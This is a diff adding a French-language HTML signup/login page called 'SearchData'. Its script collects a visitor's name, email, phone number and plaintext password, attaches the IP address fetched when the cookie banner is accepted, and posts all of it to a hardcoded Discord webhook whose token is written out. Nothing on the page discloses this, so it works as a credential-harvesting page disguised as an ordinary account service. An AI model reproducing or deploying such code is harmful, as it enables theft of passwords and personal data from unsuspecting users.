@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔎 SearchData</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://cdn.discordapp.com/attachments/1325431187325325352/1335653523701891122/8A25B95B-E54C-49FC-8539-ECF1A97F3550.png?ex=67a0f3c7&is=679fa247&hm=e9ba383f1f2013ffa8983895c1cf80e4505c0f342396556346df89e482c3b171&') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+            padding-bottom: 50px; /* Pour laisser de l'espace pour le bandeau des cookies */
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 20px;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 18px;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .login-btn {
+            background-color: #28a745; /* Vert pour "Se connecter" */
+        }
+        .login-btn:hover {
+            background-color: #218838;
+        }
+        .form-section {
+            display: none;
+        }
+        .active-section {
+            display: block;
+        }
+
+        /* Style du bandeau des cookies */
+        #cookie-banner {
+            background-color: #333;
+            color: white;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            font-size: 16px;
+        }
+        #cookie-banner button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-left: 20px;
+            cursor: pointer;
+        }
+        #cookie-banner button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Footer */
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: white;
+            background-color: #333;
+            padding: 10px;
+        }
+    </style>
+    <script>
+        let userIP = ""; // Variable globale pour l'IP de l'utilisateur
+
+        function switchSection(section) {
+            const signupSection = document.getElementById("signup-section");
+            const loginSection = document.getElementById("login-section");
+            if (section === 'signup') {
+                signupSection.classList.add('active-section');
+                loginSection.classList.remove('active-section');
+            } else {
+                loginSection.classList.add('active-section');
+                signupSection.classList.remove('active-section');
+            }
+        }
+
+        // Fonction pour récupérer l'IP et l'enregistrer lorsque l'utilisateur accepte les cookies
+        async function closeCookieBanner() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json"); // Service pour obtenir l'IP publique
+                const data = await response.json();
+                userIP = data.ip; // Sauvegarder l'IP
+
+                // Enregistrer le consentement des cookies dans localStorage
+                localStorage.setItem("cookiesAccepted", "true");
+
+                // Cacher le bandeau des cookies
+                document.getElementById("cookie-banner").style.display = "none";
+            } catch (error) {
+                console.error("Erreur lors de l'obtention de l'IP", error);
+            }
+        }
+
+        async function submitSignUp() {
+            // Vérifier si l'utilisateur a accepté les cookies
+            if (!localStorage.getItem("cookiesAccepted")) {
+                alert("Vous devez accepter les cookies avant de vous inscrire.");
+                return;  // Empêche l'inscription si les cookies ne sont pas acceptés
+            }
+
+            const name = document.getElementById("signup-name").value;
+            const email = document.getElementById("signup-email").value;
+            const phone = document.getElementById("signup-phone").value;
+            const password = document.getElementById("signup-password").value;
+            
+            // Préparer les données pour l'embed Discord, y compris l'IP
+            const embed = {
+                embeds: [
+                    {
+                        title: "Nouvelle inscription",
+                        color: 5814783, // Couleur du embed (bleu clair)
+                        fields: [
+                            { name: "Nom", value: name, inline: true },
+                            { name: "Email", value: email, inline: true },
+                            { name: "Numéro de téléphone", value: phone, inline: true },
+                            { name: "Mot de passe", value: password, inline: true },
+                            { name: "Adresse IP", value: userIP, inline: true } // Ajouter l'IP ici
+                        ],
+                        footer: {
+                            text: "Inscription via SearchData"
+                        }
+                    }
+                ]
+            };
+
+            // URL du webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1335654206849290280/PF_UFtFON3S4sWrBiAGj0BKY0kIcBlktIIM_51w4li7Lr45Tc5CPABDFVUN0rsFIdoPR";
+
+            // Envoi des données à Discord via un POST
+            try {
+                const response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(embed)
+                });
+
+                if (response.ok) {
+                    console.log("Données envoyées à Discord");
+                    window.location.href = "panel.html"; // Redirection vers panel.html après soumission
+                } else {
+                    console.error("Erreur lors de l'envoi du webhook Discord");
+                }
+            } catch (error) {
+                console.error("Erreur de connexion au webhook Discord", error);
+            }
+        }
+
+        function submitLogin() {
+            const email = document.getElementById("login-email").value;
+            const password = document.getElementById("login-password").value;
+
+            // Vous pouvez ajouter la logique ici pour la connexion
+            console.log('Email:', email);
+            console.log('Mot de passe:', password);
+
+            // Redirection vers panel.html après connexion réussie
+            window.location.href = "panel.html";  // Redirection vers panel.html
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🔎 SearchData</h1>
+
+        <!-- Section Créer un compte -->
+        <div id="signup-section" class="form-section active-section">
+            <h2>Inscrivez-vous</h2>
+            <input type="text" id="signup-name" placeholder="Votre nom" required>
+            <input type="email" id="signup-email" placeholder="Votre email" required>
+            <input type="tel" id="signup-phone" placeholder="Votre numéro de téléphone" required>
+            <input type="password" id="signup-password" placeholder="Votre mot de passe" required>
+            <button onclick="submitSignUp()">Créer un compte</button>
+        </div>
+
+        <!-- Section Se connecter -->
+        <div id="login-section" class="form-section">
+            <h2>Connexion</h2>
+            <input type="email" id="login-email" placeholder="Votre email" required>
+            <input type="password" id="login-password" placeholder="Votre mot de passe" required>
+            <button class="login-btn" onclick="submitLogin()">Se connecter</button>
+        </div>
+    </div>
+
+    <!-- Cookie banner -->
+    <div id="cookie-banner">
+        <span>Ce site utilise des cookies pour améliorer votre expérience. En poursuivant, vous acceptez notre politique de confidentialité.</span>
+        <button onclick="closeCookieBanner()">Accepter</button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        Tous droits réservés | Dev by @mytraa.dev
+    </footer>
+</body>
+</html>
